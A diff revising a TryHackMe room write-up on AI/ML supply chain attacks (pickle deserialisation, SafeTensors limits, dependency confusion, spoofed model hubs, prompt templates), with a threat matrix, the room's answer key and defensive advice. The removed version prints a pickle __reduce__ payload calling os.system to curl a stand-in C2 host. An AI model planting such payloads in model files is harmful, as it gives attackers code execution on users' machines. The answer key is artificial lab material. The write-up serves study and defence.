@@ -1,120 +1,129 @@
-# Supply Chain Attack Vectors - Room Write-Up
+# TryHackMe - Supply Chain Attack Vectors
 
-**Room Link:** [TryHackMe - Supply Chain Attack Vectors](https://tryhackme.com/room/supplychain-attack-vectors)  
-**Category:** AI / ML Security  
-**Difficulty:** Medium  
-**Role:** AI Security Engineer  
-**Focus:** Malicious Model Deserialization, Dependency Confusion, Model Repository Manipulation, and API Supply Chain Risks  
-**Framework Alignment:** OWASP LLM03 (Supply Chain Vulnerabilities) | MITRE ATLAS AML.T0010 (ML Supply Chain Compromise)
-
----
-
-## 1. Scenario & Executive Summary
-
-The scenario takes place at **TryTrainMe**, where an attacker claimed to maintain access to enterprise servers for three weeks through an "AI-powered" code reviewer. The security team is tasked with investigating an end-to-end multi-vector supply chain attack.
-
-Unlike single-vector demonstrations, real-world adversaries stack compromises across multiple supply-chain tiers. If a defense blocks a payload at the model layer, fallback mechanisms at the dependency or repository tier maintain persistence. This room breaks down how attackers turn trusted ML components—from raw pickle binaries and Keras lambda layers to typosquatted Hugging Face namespaces and shared prompt templates—into execution paths.
-
-### Primary Objectives
-* Disassemble and analyze malicious Python `pickle` streams without invoking code execution.
-* Identify the operational boundaries of safe formats (e.g., how **SafeTensors** protects against serialization attacks but leaves architecture-level vulnerabilities like Keras `Lambda` layers intact).
-* Deconstruct software package tampering via dependency confusion and typosquatting.
-* Investigate repository-level manipulation and identity impersonation on machine learning hubs.
-* Audit risks unique to downstream API and Prompt Supply Chains (e.g., prompt template poisoning and silent model drift).
+**Platform**: [TryHackMe](https://tryhackme.com/room/supplychain-attack-vectors)  
+**Difficulty**: Medium  
+**Category**: AI / ML Security  
+**Date**: 08 Nov 2026  
+**Time spent**: ~2 hours (including write-up)  
+**Tags**: `#AI-security` `#SupplyChain` `#Pickle` `#SafeTensors` `#DependencyConfusion` `#PromptSecurity`
 
 ---
 
-## 2. Technical Attack Vectors & Deep Dive
+## Summary
 
-### Vector 1: Malicious Model Serialization & Deserialization
+At TryTrainMe, an attacker claimed three weeks of access to enterprise servers through an “AI-powered” code reviewer. The investigation reveals a multi-vector supply chain attack that stacks compromises across model files, packages, repositories, and prompt templates, aligning with OWASP LLM03 and MITRE ATLAS AML.T0010.
 
-Python's `pickle` remains a standard serialized checkpoint format for frameworks like PyTorch (`.pt`, `.bin`, `.pkl`). Because `pickle` implements an arbitrary stack-based virtual machine, reconstructing objects can trigger arbitrary system command execution.
+## Key Takeaways
 
-* **Reconstruction Hook (`__reduce__`):** When serializing custom classes, Python queries `__reduce__()` for a callable and argument tuple. Malicious actors bind execution sinks to this method:
-  ```python
-  import os
-  class MaliciousPayload:
-      def __reduce__(self):
-          return (os.system, ('curl http://malicious.c2/beacon',))
-  ```
-* **Opcode Inspection (`pickletools`):** Analysts can disassemble bytecode streams without executing them via Python's built-in `pickletools` module:
-  ```bash
-  python3 -m pickletools suspicious_model.pkl
-  ```
-  The disassembly reveals opcodes such as `STACK_GLOBAL` (importing modules like `os` or `subprocess`) followed by execution opcodes (like `REDUCE`).
-
-### Vector 2: Serialization vs. Architecture-Level Attacks
-
-While migrating to **SafeTensors** mitigates bytecode deserialization RCE, it does not sanitize malicious deep-learning layer configurations.
-
-* **SafeTensors Scope:** Eliminates **serialization-level attacks** by storing raw tensor byte buffers and a JSON metadata header, rejecting arbitrary object instantiations.
-* **Architecture-Level Attacks:** Model architectures that support arbitrary Python code evaluation (such as Keras/TensorFlow `.h5` files containing custom `Lambda` layers) remain vulnerable. Converting a model to SafeTensors strips pickle opcodes, but architecture-level evaluation vectors persist if untrusted computational layers execute during dynamic graph assembly.
-
-### Vector 3: Dependency Confusion & Typosquatting
-
-Adversaries exploit package management resolution order across private and public package indexes.
-
-* **Dependency Confusion:** Occurs when an internal, privately hosted corporate package name (e.g., `trytrainme-auth`) is claimed on a public registry (such as PyPI or npm) with an artificially high version number (e.g., `99.9.9`). Default installer configurations pull the public malicious package into CI/CD pipelines.
-* **Typosquatting:** Registering packages with names visually or phonetically similar to established libraries (e.g., registering `torchtriton` to capture typos when pulling `torch`).
-
-### Vector 4: Repository Manipulation (ML Hubs)
-
-On open model repositories like Hugging Face:
-* Attackers create spoofed publisher organizations (e.g., `trustworthy-ai-lab`) to imitate verified academic or enterprise publishers.
-* They upload seemingly benign weights accompanied by clean model cards while hosting malicious artifacts or backdoor triggers within checkpoints or tokenizer auxiliary scripts.
-
-### Vector 5: API & Prompt Template Supply Chain
-
-When consuming AI through hosted APIs, the supply chain shifts from local code execution to behavioural compromise:
-* **Prompt Template Injection:** Sourcing dynamic system prompts or LangChain templates from untrusted external repositories allows upstream attackers to silently compromise downstream applications that inherit the template.
-* **Silent Model Updates:** Hosted API providers changing underlying model weights or routing logic without formal notification, introducing behavioral regressions, hallucination vectors, or security bypasses.
+- **Adversaries stack vectors** — Attackers do not rely on a single technique; if model deserialisation fails, dependency confusion or repository manipulation acts as a fallback.
+- **`pickle` deserialisation is arbitrary code execution** — Loading untrusted pickle files exposes the host system via the `__reduce__` method and the `os` module.
+- **SafeTensors is not a silver bullet** — While it neutralises serialisation-level execution, architecture-level threats (such as malicious Keras `Lambda` layers) persist.
+- **Supply chains extend to prompts and APIs** — Silent model changes and untrusted prompt templates alter downstream application behaviour without running host-level code.
 
 ---
 
-## 3. Threat Matrix & Defensive Controls
+## Learning Objectives & Tasks
 
-```
-[ Compromised Hub Repo ] ──> [ Malicious Pickle Stream ] ──> [ os.system via __reduce__ ] ──> (RCE)
-            │
-            ├──────────────> [ Dependency Confusion ]    ──> (Fallback Code Execution)
-            │
-            └──────────────> [ Tampered Prompt Template] ──> (Systemic Prompt Hijack)
+### Task 1 – Summary & Overview
+
+Sets the scene for the multi-layer breach at TryTrainMe. Highlights how modern AI applications rely on complex, interdependent supply chains spanning weights, code packages, public hubs, and upstream prompts.
+
+### Task 2 – Core Attack Vectors
+
+Adversaries leverage multiple layers of the machine learning pipeline to gain initial access and establish persistence.
+
+#### Vector 1: Malicious Model Serialisation (Pickle)
+
+Python’s `pickle` format implements a stack-based virtual machine. When an untrusted model is loaded, custom objects can trigger arbitrary code execution:
+
+- Pickle invokes the **`__reduce__`** method to fetch reconstruction instructions.
+- The **`os`** module serves as the primary sink for operating system commands.
+- The **`REDUCE`** opcode executes the callable provided by `STACK_GLOBAL`.
+
+Safe static analysis and disassembly are conducted via:
+
+```bash
+python3 -m pickletools suspicious_model.pkl
 ```
 
-| Attack Layer | Mechanism / Indicator | Impact | Hardened Mitigation |
+In the lab exercise, the payload triggers an outbound connection attempt to `attacker.com`.
+
+#### Vector 2: Serialisation vs Architecture-Level Attacks
+
+Converting a Keras `.h5` model to SafeTensors:
+- Eliminates pickle-based payloads (**serialisation-level attacks**).
+- Leaves **architecture-level attacks** untouched.
+- Fails to neutralise suspicious **`Lambda`** layers.
+
+SafeTensors stores raw tensor arrays alongside JSON metadata and rejects arbitrary object instantiation. However, custom layers that evaluate computational code during graph construction remain an active vector.
+
+#### Vector 3: Dependency Confusion & Typosquatting
+
+- **Dependency confusion** – An attacker registers a public package using the same name as an internal corporate library, appending a higher version number so package managers fetch the external payload.
+- **Typosquatting** – An attacker registers names visually similar to widely adopted packages or models (e.g., `torchtriton`).
+
+#### Vector 4: Model Repository Manipulation
+
+Threat actors establish spoofed publisher profiles on hosting platforms like Hugging Face (e.g., `trustworthy-ai-lab`) to make modified, backdoored models appear legitimate to downstream developers.
+
+#### Vector 5: API & Prompt Template Supply Chain
+
+When consuming AI capabilities upstream via remote APIs:
+- **Silent model updates** swap underlying model checkpoints without consumer notice.
+- **Untrusted prompt templates** or system instructions introduce systemic behavioural compromises across any application ingesting them.
+
+---
+
+## Threat Matrix & Mitigations
+
+| Attack Layer | Mechanism / Indicator | Impact | Primary Mitigation |
 | :--- | :--- | :--- | :--- |
-| **Model Serialization** | `__reduce__` calling `os` via `STACK_GLOBAL` | Remote Code Execution | Disallow raw pickle; enforce `SafeTensors`; parse safely with `pickletools` / `fickling`. |
-| **Model Architecture** | Malicious Keras `Lambda` layers inside `.h5` | Code execution / Arbitrary graph ops | Restrict untrusted custom layer evaluation; inspect model graphs before loading. |
-| **Dependencies** | Public PyPI package overriding private names | Pipeline compromise | Pin private registry index URLs; enforce strict version locking; sign build artifacts. |
-| **Model Registry** | Impersonation orgs (`trustworthy-ai-lab`) | Delivery of tampered weights | Verify publisher signatures; pin cryptographic commit SHAs; avoid unvetted hubs. |
-| **Prompt Pipeline** | Sourcing prompt templates from external repos | Systemic LLM behavioral control | Treat prompts as code; store prompts internally under version control and peer review. |
+| **Model Serialisation** | `__reduce__` → `os` via `STACK_GLOBAL` / `REDUCE` | RCE | Prefer SafeTensors; inspect with `pickletools` / Fickling; set `weights_only=True` |
+| **Model Architecture** | Malicious Keras `Lambda` layers | Arbitrary code execution / graph abuse | Audit computation graphs; disallow arbitrary custom layer execution |
+| **Dependencies** | Public package overrides internal library | Build and deployment pipeline takeover | Pin strict versions; enforce private package index URLs; verify hashes |
+| **Model Registry** | Spoofed organisations (`trustworthy-ai-lab`) | Distribution of tampered weights | Enforce strict vendor validation; pin commit SHAs; avoid unvetted hubs |
+| **Prompt / API Pipeline** | Upstream prompt templates or silent updates | Systemic behavioural control / injection | Treat prompts as version-controlled code; enforce change-management review |
 
 ---
 
-## 4. Question & Answer Reference
+## Question & Answer Reference
 
-| Step / Prompt | Question / Concept | Answer / Key Value |
-| :---: | :--- | :--- |
-| **1** | Python method `pickle` calls to retrieve reconstruction instructions for custom objects | `__reduce__` |
-| **2** | Built-in Python module commonly abused in pickle payloads to run system commands | `os` |
-| **3** | Type of attack left completely untouched when converting a Keras model to SafeTensors | `architecture-level attacks` |
-| **4** | Suspicious Keras layer type that format conversion fails to remove from `.h5` files | `Lambda` |
-| **5** | Python module used to safely disassemble pickle files without executing bytecode | `pickletools` |
-| **6** | Python opcode responsible for executing the function specified by `STACK_GLOBAL` | `REDUCE` |
-| **7** | Attack where a public package overrides an internal private package of the same name | `dependency confusion` |
-| **8** | Technique involving registration of names closely resembling legitimate repositories | `typosquatting` |
-| **9** | Vector represented by creating the `trustworthy-ai-lab` organization on Hugging Face | `repository manipulation` |
-| **10** | Fallback vector granting attackers RCE if the pickle payload had been blocked | `dependency confusion` |
-| **11** | Risk where the model behind an API endpoint is changed without consumer knowledge | `silent model update` |
-| **12** | Untrusted supply chain artifact capable of altering LLM behavior across all calling apps | `prompt template` |
+| # | Question | Answer |
+| :-: | :--- | :--- |
+| **1** | Python method pickle calls for reconstruction instructions | `__reduce__` |
+| **2** | Built-in module commonly abused in pickle payloads | `os` |
+| **3** | Attack type left untouched by SafeTensors conversion | architecture-level attacks |
+| **4** | Suspicious layer type that survives conversion from `.h5` | `Lambda` |
+| **5** | Module for safe pickle disassembly | `pickletools` |
+| **6** | Opcode that executes the function from `STACK_GLOBAL` | `REDUCE` |
+| **7** | Public package overrides internal package of same name | dependency confusion |
+| **8** | Technique of registering closely resembling names | typosquatting |
+| **9** | Vector used by creating `trustworthy-ai-lab` on Hugging Face | repository manipulation |
+| **10** | Fallback vector if pickle payload is blocked | dependency confusion |
+| **11** | Model behind an API endpoint changed without notice | silent model update |
+| **12** | Untrusted artefact that can alter LLM behaviour across apps | prompt template |
 
 ---
 
-## 5. Correlated Resources & Continuing Modules
+## Defensive Perspective
 
-* **Prerequisite Room:** [TryHackMe: Understanding AI Supply Chains](https://tryhackme.com/room/understanding-ai-supplychains)
-* **Next Room in Series:** [TryHackMe: Securing the AI Supply Chain](https://tryhackme.com/room/securing-the-ai-supply-chain)
-* **Hands-on Defenses:**
-  * Model scanning with **Fickling** and **ModelScan**.
-  * Dependency verification via **pip-audit** and SBOM creation with **Syft**.
-  * Dynamic prompt evaluation via internal prompt regression testing.
+- Default to SafeTensors formats over pickle-based alternatives whenever possible.
+- Scan models with tools like **Fickling** and **ModelScan** prior to pipeline ingestion.
+- Enforce strict zero-trust validation on external models, repositories, and prompt templates.
+- Pin package versions and internal registry index URLs to thwart dependency confusion.
+- Continuously monitor API endpoints for behavioural anomalies or unannounced model updates.
+- Store, audit, and peer-review prompt templates under source control.
+
+---
+
+## Resources & Next Steps
+
+- **Prerequisite Room**: Understanding AI Supply Chains
+- **Next Room**: Securing the AI Supply Chain
+- **Defensive Tooling**: Fickling, ModelScan, `pip-audit`, Syft (Software Bills of Materials)
+
+---
+
+## Final Summary
+
+Securing AI applications requires treating models, dependencies, repositories, and prompt files as critical supply chain components. Blocking unsafe serialisation like `pickle` is only the first line of defence; robust protection demands signed artefacts, private dependency verification, computational graph inspection, and rigorous prompt auditing.
